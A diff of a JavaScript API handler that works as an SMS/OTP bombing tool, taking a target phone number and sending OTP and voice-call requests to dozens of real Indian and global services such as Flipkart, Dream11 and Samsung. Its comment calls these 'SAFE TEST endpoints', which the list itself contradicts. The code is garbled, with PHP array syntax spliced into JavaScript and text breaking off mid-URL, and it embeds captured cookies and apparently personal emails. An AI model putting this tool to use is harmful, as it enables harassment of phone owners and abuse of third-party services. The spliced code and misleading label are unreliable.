@@ -1,40 +1,508 @@
+// api/index.js
 export default async function handler(req, res) {
   if (req.method !== 'GET') {
     return res.status(405).json({ status: 'error', message: 'Method not allowed' });
   }
 
-  const { key, number } = req.query;
+  const { key, number, delay } = req.query;
 
-  // 🔒 Auth check
+  // Auth check
   if (key !== 'only4premium') {
     return res.status(401).json({ status: 'error', message: 'Unauthorized access' });
   }
 
-  // 📱 Validate number
+  // Validate mobile
   if (!number || number.length !== 10 || isNaN(number)) {
     return res.status(400).json({ status: 'error', message: 'Invalid mobile number' });
   }
 
-  // 🟢 Send immediate response to client (no waiting)
-  res.status(200).json({
-    status: 'ok',
-    message: `Processing started for ${number}`,
-    note: 'OTP requests running in background',
-    data: {
-      owner: '@om_divine',
-      api_type: 'free',
-      contact: '@om_divine'
-    }
-  });
+  // per-request delay (ms) between API calls — default 500ms
+  const perRequestDelay = Math.max(0, parseInt(delay || '500', 10));
 
-  // 🧠 Background process (non-blocking)
-  runAllApis(number);
+  // Build list of APIs to call (SAFE TEST endpoints).
+  const apis = getApis(number);
+
+  // We'll collect a minimal report to return
+  const report = {
+    number,
+    total: apis.length,
+    successes: 0,
+    failures: 0,
+    details: []
+  };
+
+  // Sequentially execute each API with timeout and error-safe behavior
+  for (let i = 0; i < apis.length; i++) {
+    const api = apis[i];
+    try {
+      const result = await executeApiWithTimeout(api, number, 6000); // 6s per request timeout
+      if (result.status && result.status >= 200 && result.status < 300) {
+        report.successes++;
+      } else {
+        report.failures++;
+      }
+      report.details.push({
+        index: i + 1,
+        url: api.url,
+        method: api.method || 'GET',
+        status: result.status,
+        error: result.error || null
+      });
+      // Small delay between requests to avoid very rapid firing
+      if (perRequestDelay > 0) await sleep(perRequestDelay);
+    } catch (err) {
+      // Shouldn't happen because executeApiWithTimeout returns error object, but guard anyway
+      report.failures++;
+      report.details.push({
+        index: i + 1,
+        url: api.url,
+        method: api.method || 'GET',
+        status: 0,
+        error: String(err)
+      });
+    }
+  }
+
+  // Return consolidated JSON result (no crash even if some calls failed)
+  return res.status(200).json({
+    status: 'ok',
+    message: `Completed sequential run for ${number}`,
+    summary: {
+      total: report.total,
+      successes: report.successes,
+      failures: report.failures
+    },
+    details: report.details
+  });
 }
 
-async function runAllApis(mobile) {
-  const apis = getApis(mobile);
+/* --- helper functions --- */
 
-  for (let i = 0; i < apis.length; i++) {
+async function executeApiWithTimeout(api, mobile, timeoutMs = 6000) {
+  const controller = new AbortController();
+  const to = setTimeout(() => controller.abort(), timeoutMs);
+
+  try {
+    const method = (api.method || 'GET').toUpperCase();
+    // Build headers (clone to avoid mutation)
+    const headers = Object.assign({}, api.headers || {});
+    // ensure User-Agent and Accept exist
+    if (!headers['User-Agent']) headers['User-Agent'] = 'otp-simulator/1.0';
+    if (!headers['Accept']) headers['Accept'] = '*/*';
+
+    // Prepare body: replace {mobile} placeholder if present
+    let body = api.data || null;
+    if (body && typeof body === 'string') {
+      body = body.replace(/{mobile}/g, mobile);
+    } else if (body && typeof body === 'object') {
+      // make a JSON string and replace placeholders
+      body = JSON.stringify(body).replace(/{mobile}/g, mobile);
+    }
+
+    const options = {
+      method,
+      headers,
+      signal: controller.signal
+    };
+
+    if (body && (method === 'POST' || method === 'PUT' || method === 'PATCH')) {
+      options.body = body;
+      if (!options.headers['Content-Type'] && looksLikeJson(body)) {
+        options.headers['Content-Type'] = 'application/json; charset=utf-8';
+      }
+    }
+
+    const resp = await fetch(api.url, options);
+    clearTimeout(to);
+    return { status: resp.status, url: api.url };
+  } catch (err) {
+    clearTimeout(to);
+    const message = err && err.name === 'AbortError' ? 'timeout' : (err && err.message) || String(err);
+    return { status: 0, url: api.url, error: message };
+  }
+}
+
+function sleep(ms) {
+  return new Promise(resolve => setTimeout(resolve, ms));
+}
+
+function looksLikeJson(str) {
+  try {
+    JSON.parse(str);
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * SAFE list of test endpoints. Replace only with endpoints YOU OWN.
+ * Do NOT paste third-party production OTP endpoints here.
+ */
+function getApis(mobile) {
+  return [
+            "url" => "https://stage-api-gateway.getzype.com/auth/signinup/code",
+            "method" => "POST",
+            "data" => json_encode(["hashKey" => "", "phoneNumber" => "+91" . $mobile])
+        ],
+        [
+            "url" => "https://www.brevistay.com/cst/app-api/login",
+            "method" => "POST",
+            "data" => json_encode(["is_otp" => 1.0, "mobile" => $mobile, "is_password" => 0.0])
+        ],
+        [
+            "url" => "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
+            "method" => "POST", 
+            "data" => json_encode(["mfa_channels" => ["phno" => ["number" => (float)$mobile, "country_code" => "+91"]]])
+        ],
+        [
+            "url" => "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
+            "method" => "POST",
+            "data" => json_encode(['country_code' => '+91', 'phone' => $mobile]),
+        ],
+        [
+            "url" => "https://apps.ucoonline.in/Lead_App/send_message.jsp?mob=&ref_no=&otpv=&appRefNo=&lgName=fdgefgdgg&lgAddress=dfgdsggfesdggg&lgPincode=695656&lgState=DL&lgDistrict=NORTH%2BDELHI&lgBranch=0313&lgMobileno={$mobile}&lgEmail=sundeshaakshays%40gmail.com&lgFacilities=CC&lgTentAmt=656556565&lgRemarks=efwfwfsafw&declare_check=on&captchaRefno=315904&captchaResult=71&firstName=Gjgjgjgv&password=ghfughdsy-5_33%23&requestType=SENDOTP&mobileNumber={$mobile}&login=gjghgug%40gmail.com&genderType=Male",
+            "method" => "POST",
+            "data" => null
+        ],
+        [
+            "url" => "https://xylem-api.penpencil.co/v1/users/resend-otp?smsType=1",
+            "method" => "POST",
+            "data" => json_encode(["organizationId" => "64254d66be2a390018e6d348", "mobile" => $mobile])
+        ],
+        [
+            "url" => "https://mobileonline.sai.org.in/ssst/mobileLoginOtp",
+            "method" => "POST", 
+            "data" => json_encode(["mobileNumber" => $mobile])
+        ],
+        [
+            "url" => "https://api.penpencil.co/v1/users/resend-otp?smsType=2",
+            "method" => "POST",
+            "data" => json_encode(["organizationId" => "5eb393ee95fab7468a79d189", "mobile" => $mobile])
+        ],
+        [
+            "url" => "https://force.eazydiner.com/web/otp",
+            "method" => "POST",
+            "data" => json_encode(["mobile" => "+91" . $mobile])
+        ],
+        [
+            "url" => "https://antheapi.aakash.ac.in/api/generate-lead-otp",
+            "method" => "POST",
+            "data" => json_encode([
+                "mobile_psid" => $mobile,
+                "activity_type" => "aakash-myadmission",
+                "webengageData" => [
+                    "profile" => "student",
+                    "whatsapp_opt_in" => true,
+                    "method" => "mobile"
+                ],
+                "mobile_number" => ""
+            ])
+        ],
+        [
+            "url" => "https://1.rome.api.flipkart.com/1/action/view?=",
+            "method" => "POST",
+            "headers" => [
+                "X-user-agent: Mozilla/5.0 (Linux; Android 9; RMX1833 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.185 Mobile Safari/537.36FKUA/msite/0.0.3/msite/Mobile",
+                "Content-Type: application/json; charset=utf-8",
+                "Content-Length: 277",
+                "Host: 1.rome.api.flipkart.com",
+                "Connection: Keep-Alive",
+                "Accept-Encoding: gzip",
+                "User-Agent: okhttp/3.9.1"
+            ],
+            "data" => json_encode([
+                "actionRequestContext" => [
+                    "type" => "LOGIN_IDENTITY_VERIFY",
+                    "loginIdPrefix" => "+91",
+                    "loginId" => $mobile,
+                    "clientQueryParamMap" => [
+                        "ret" => "/",
+                        "entryPage" => "HOMEPAGE_HEADER_ACCOUNT"
+                    ],
+                    "loginType" => "MOBILE",
+                    "verificationType" => "OTP",
+                    "screenName" => "LOGIN_V4_MOBILE",
+                    "sourceContext" => "DEFAULT"
+                ]
+            ])
+        ],
+        [
+            "url" => "https://api.khatabook.com/v1/auth/request-otp",
+            "method" => "POST",
+            "headers" => [
+                "Host: api.khatabook.com",
+                "content-type: application/json; charset=utf-8",
+                "content-length: 73",
+                "accept-encoding: gzip",
+                "user-agent: okhttp/3.9.1"
+            ],
+            "data" => json_encode([
+                "app_signature" => "Jc/Zu7qNqQ2",
+                "country_code" => "+91",
+                "phone" => $mobile
+            ])
+        ],
+        [
+            "url" => "https://api.penpencil.co/v1/users/register/5eb393ee95fab7468a79d189",
+            "method" => "POST",
+            "headers" => [
+                "Host: api.penpencil.co",
+                "content-type: application/json; charset=utf-8",
+                "content-length: 76",
+                "accept-encoding: gzip",
+                "user-agent: okhttp/3.9.1"
+            ],
+            "data" => json_encode([
+                "firstName" => "Hiii",
+                "lastName" => "",
+                "countryCode" => "+91",
+                "mobile" => $mobile
+            ])
+        ],
+        [
+            "url" => "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
+            "method" => "POST",
+            "headers" => [
+                "Host: www.rummycircle.com",
+                "content-type: application/json; charset=utf-8",
+                "content-length: 123",
+                "accept-encoding: gzip",
+                "user-agent: okhttp/3.9.1"
+            ],
+            "data" => json_encode([
+                "isPlaycircle" => false,
+                "mobile" => $mobile,
+                "deviceId" => "6ebd671c-a5f7-4baa-904b-89d4f898ee79",
+                "deviceName" => "",
+                "refCode" => ""
+            ])
+        ],
+        [
+            "url" => "https://www.dream11.com/auth/passwordless/init",
+            "method" => "POST",
+            "headers" => [
+                "Host: www.dream11.com",
+                "content-type: application/json; charset=utf-8",
+                "content-length: 85",
+                "accept-encoding: gzip",
+                "user-agent: okhttp/3.9.1"
+            ],
+            "data" => json_encode([
+                "phoneNumber" => $mobile,
+                "templateName" => "default",
+                "channel" => "sms",
+                "flow" => "SIGNIN"
+            ])
+        ],
+        [
+            "url" => "https://www.samsung.com/in/api/v1/sso/otp/init",
+            "method" => "POST",
+            "headers" => [
+                "Host: www.samsung.com",
+                "content-type: application/json; charset=utf-8",
+                "content-length: 24",
+                "accept-encoding: gzip",
+                "user-agent: okhttp/3.9.1"
+            ],
+            "data" => json_encode([
+                "user_id" => $mobile
+            ])
+        ],
+        [
+            "url" => "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
+            "method" => "POST",
+            "headers" => [
+                "Host: mobapp.tatacapital.com",
+                "content-type: application/json; charset=utf-8",
+                "content-length: 67",
+                "accept-encoding: gzip",
+                "user-agent: okhttp/3.9.1"
+            ],
+            "data" => json_encode([
+                "phone" => $mobile,
+                "applSource" => "",
+                "isOtpViaCallAtLogin" => "true"
+            ])
+        ],
+        [
+            "url" => "https://www.shopsy.in/api/1/action/view",
+            "method" => "POST",
+            "headers" => [
+                "Content-Type: application/json; charset=utf-8",
+                "Content-Length: 430",
+                "Host: www.shopsy.in",
+                "Connection: Keep-Alive",
+                "Accept-Encoding: gzip",
+                "User-Agent: okhttp/3.9.1"
+            ],
+            "data" => json_encode([
+                "actionRequestContext" => [
+                    "type" => "LOGIN_IDENTITY_VERIFY",
+                    "loginIdPrefix" => "+91",
+                    "loginId" => $mobile,
+                    "clientQueryParamMap" => [
+                        "ret" => "/?cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAiAqY6tBhAtEiwAHeRopXAJTIrS2X5hOOJmzNAsD6nHlHPQKbsgdim8CouDsrnvUxhaD9NpyhoCNWQQAvD_BwE",
+                        "entryPage" => "HEADER_ACCOUNT"
+                    ],
+                    "loginType" => "MOBILE",
+                    "verificationType" => "OTP",
+                    "screenName" => "LOGIN_V4_MOBILE",
+                    "sourceContext" => "DEFAULT"
+                ]
+            ])
+        ],
+        [
+            "url" => "https://seller.flipkart.com/napi/graphql",
+            "method" => "POST",
+            "headers" => [
+                "Content-Type: application/json; charset=utf-8",
+                "Content-Length: 216",
+                "Host: seller.flipkart.com",
+                "Connection: Keep-Alive",
+                "Accept-Encoding: gzip",
+                "User-Agent: okhttp/3.9.1"
+            ],
+            "data" => json_encode([
+                "variables" => [
+                    "mobileNo" => $mobile
+                ],
+                "query" => "mutation SellerOnboarding_GenerateOTPMobile(\$mobileNo: String!) {\n  generateOTPMobile(mobileNo: \$mobileNo)\n}\n",
+                "operationName" => "SellerOnboarding_GenerateOTPMobile"
+            ])
+        ],
+        [
+            "url" => "https://identity.tllms.com/api/request_otp",
+            "method" => "POST",
+            "data" => json_encode(["phone" => $mobile, "app_client_id" => "90391da1-ee49-4378-bd12-1924134e906e"])
+        ],
+        [
+            "url" => "https://hyuga-auth-service.pratech.live/v1/auth/otp/generate",
+            "method" => "POST",
+            "data" => json_encode(["mobile_number" => $mobile])
+        ],
+        [
+            "url" => "https://webapi.tastes2plate.com/app/new-login",
+            "method" => "POST",
+            "data" => json_encode(["device_token" => "", "mobile" => $mobile, "reffer_by" => "", "device_type" => "web"])
+        ],
+        [
+            "url" => "https://apis.tradeindia.com/app_login_api/login_app",
+            "method" => "POST",
+            "data" => json_encode(["mobile" => "+91" . $mobile])
+        ],
+        [
+            "url" => "https://m.snapdeal.com/sendOTP",
+            "method" => "POST",
+            "data" => json_encode(["purpose" => "LOGIN_WITH_MOBILE_OTP", "mobileNumber" => $mobile])
+        ],
+        [
+            "url" => "https://nma.nuvamawealth.com/edelmw-content/content/otp/register",
+            "method" => "POST",
+            "data" => json_encode([
+                "screen" => "1260 X 2624",
+                "emailID" => "shivamyou2000@gmail.com",
+                "gps" => "true",
+                "imsi" => "",
+                "mobileNo" => $mobile,
+                "firstName" => "Shiva Riy",
+                "osVersion" => "14",
+                "build" => "android-phone",
+                "countryCode" => "91",
+                "vendor" => "samsung",
+                "imei" => "181105746967606",
+                "model" => "SM-F7110",
+                "req" => "generate"
+            ])
+        ],
+        [
+            "url" => "https://www.my11circle.com/api/fl/auth/v3/getOtp",
+            "method" => "POST",
+            "data" => json_encode([
+                "isPlaycircle" => false,
+                "mobile" => $mobile,
+                "deviceId" => "03aa8dc4-6f14-4ac1-aa16-f64fe5f250a1",
+                "deviceName" => "",
+                "refCode" => ""
+            ])
+        ],
+        [
+            "url" => "https://t.rummycircle.com/api/fl/auth/v3/getOtp",
+            "method" => "POST",
+            "data" => json_encode([
+                "mobile" => $mobile,
+                "deviceId" => "426c1fec-f7e1-426d-af86-ce191adfe9b2",
+                "deviceName" => "",
+                "refCode" => "",
+                "isPlaycircle" => false
+            ])
+        ],
+        [
+            "url" => "https://www.rummycircle.com/api/fl/account/v1/sendOtp",
+            "method" => "POST",
+            "data" => json_encode([
+                "otpOnCall" => true,
+                "otpType" => 6,
+                "transactionId" => 0,
+                "mobile" => $mobile
+            ])
+        ],
+        [
+            "url" => "https://production.apna.co/api/userprofile/v1/otp/",
+            "method" => "POST",
+            "data" => json_encode([
+                "phone_number" => $mobile,
+                "retries" => 0,
+                "hash_type" => "employer",
+                "source" => "employer"
+            ])
+        ],
+        [
+            "url" => "https://nodebackend.apollodiagnostics.in/api/v1/user/send-otp",
+            "method" => "POST",
+            "data" => json_encode([
+                "mobileNumber" => $mobile
+            ])
+        ],
+        [
+            "url" => "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
+            "method" => "POST",
+            "data" => json_encode([
+                "country_code" => "91",
+                "mobile" => $mobile,
+                "locale" => "IN"
+            ])
+        ],
+        [
+            "url" => "https://api.univest.in/api/auth/send-otp?type=web4&countryCode=91&contactNumber=" . $mobile,
+            "method" => "GET",
+            "data" => null,
+            "headers" => [
+                "Host: api.univest.in",
+                "Accept-Encoding: gzip",
+                "User-Agent: okhttp/3.9.1"
+            ]
+        ],
+
+        // New APIs from curl commands
+        [
+            "url" => "https://www.my11circle.com/api/fl/auth/v1/resendOtp",
+            "method" => "POST",
+            "headers" => [
+                "Host: www.my11circle.com",
+                "accept: application/json, text/plain, */*",
+                "user-agent: {\"AppVersion\":\"11100.92\",\"OSVersion\":\"9\",\"appFlavorName\":\"reverie_playstore\",\"reverieFlavorName\":\"reverie_playstore\",\"pokerFlavourName\":\"\",\"ludoFlavourName\":\"\",\"isRCOnly\":false,\"isMecDownloaded\":true}Mozilla/5.0 (Linux; Android 9; Pixel 4 Build/PQ3A.190801.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/135.0.7049.99 Mobile Safari/537.36 (/ftprimary:295/) [FTAndroid/11100.92] [MECPlayStoreAndroid/11100.92]",
+                "sentry-trace: 137648fac4264fd5884d97e48657cada-a7a4ab1930ca3ffa",
+                "baggage: sentry-environment=production,sentry-release=reverie%4011100.92,sentry-public_key=c98826b2f6da41828e8d15cb444185ba,sentry-trace_id=137648fac4264fd5884d97e48657cada",
+                "content-type: application/json",
+                "content-length: 52",
+                "accept-encoding: gzip",
+                "cookie: sameSiteNoneSupported=true; sameSiteNoneSupported=true; SSID=SSID745549b5-969b-41d0-b11d-99bba4db5b95; AWSALB=FF8fwffZjX1BnNTdV5A5PgtZ1VLD2dwdPzsuPlx9ev3PsfBwnhiYT45ijmTOX9mHLwDbKRbVvqpUPT8bmMnfFkWISRwZvaB7TCc6RMqgLb92jE+TFfCImhsPR6YG; AWSALBCORS=FF8fwffZjX1BnNTdV5A5PgtZ1VLD2dwdPzsuPlx9ev3PsfBwnhiYT45ijmTOX9mHLwDbKRbVvqpUPT8bmMnfFkWISRwZvaB7TCc6RMqgLb92jE+TFfCImhsPR6YG; device.info.cookie={\"bv\":\"135.0.7049.99\"; \"osv\":\"9\"=; \"osn\":\"Android\"=; \"tbl\":\"false\"=; \"vnd\":\"Google\"=; \"mdl\":\"Pixel\"}="
+            ],
+            "data" => json_encode(["otpOnCall" => true, "otpType" => 6, "mobile" => $mobile])
+        ],
+        [
+            "url" => "https://user.vedantu.com/user/pr  for (let i = 0; i < apis.length; i++) {
     const api = apis[i];
     try {
       const response = await executeApi(api, mobile);
